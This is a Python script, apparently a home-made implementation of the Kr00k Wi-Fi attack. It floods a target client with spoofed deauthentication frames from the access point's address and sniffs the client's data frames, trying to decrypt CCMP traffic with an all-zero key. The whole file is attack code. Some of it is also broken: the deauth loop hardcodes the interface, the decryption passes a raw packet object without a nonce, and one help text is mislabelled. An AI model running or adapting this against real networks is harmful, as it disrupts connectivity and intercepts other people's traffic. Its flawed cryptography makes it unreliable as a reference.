from time import sleep
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11CCMP
from scapy.all import sniff, sendp, scapy
import argparse
import threading
from Crypto.Cipher import AES


class Kr00k:
    def __init__(self, macAP, macTarget, interfaceName):
        self.macAP = macAP
        self.macTarget = macTarget
        self.interface = interfaceName
        self.nbPacket = 0


    def packet(self, sniffedPacket):
        print(sniffedPacket)
        print(type(sniffedPacket))
        if sniffedPacket[Dot11].type == 2 and sniffedPacket.haslayer(Dot11CCMP):
            tk = bytes.fromhex("00000000000000000000000000000000")
            encrypted = AES.new(tk, AES.MODE_CCM)
            decrypted = encrypted.decrypt(sniffedPacket)
            print(decrypted)
            self.nbPacket = self.nbPacket + 1
            return decrypted
        else:
            print("error")


    def deauth(self):
        deauthPacket = RadioTap() / Dot11(type=0, subtype=12,
                                          addr1=self.macTarget,
                                          addr2=self.macAP,
                                          addr3=self.macAP)/Dot11Deauth(reason=7)
        while True:
            sendp(deauthPacket, iface="prism0", count=1, verbose=False)
            sleep(.1)
            print("deauth sent")


def main():
    try:
        parser = argparse.ArgumentParser(description="my take on kr00k")
        parser.add_argument("-a", "--ap", required=True,
                            help="client mac address", type=str)
        parser.add_argument("-t", "--target", required=True,
                            help="target mac address", type=str)
        parser.add_argument("-i", "--interface",
                            help="name of the interface in monitor mode",
                            type=str, default="prism0")
        args = parser.parse_args()
        ap = args.ap
        target = args.target
        interface = args.interface

        krook = Kr00k(ap, target, interface)

        deauthThread = threading.Thread(target=krook.deauth)
        deauthThread.daemon = True
        deauthThread.start()

        s_filter = "ether src " + str(target) + " and ether dst " + str(ap) + " and type Data"
        sniff(iface=interface, filter=s_filter, prn=krook.packet)
        print('\n\033[1;32m' + str(krook.nbPacket) + " packed kr00ked so far"
              + '\033[0m' + "\nGoodbye !")

    except scapy.error.Scapy_Exception:
        print("Scapy_Exception")


main()
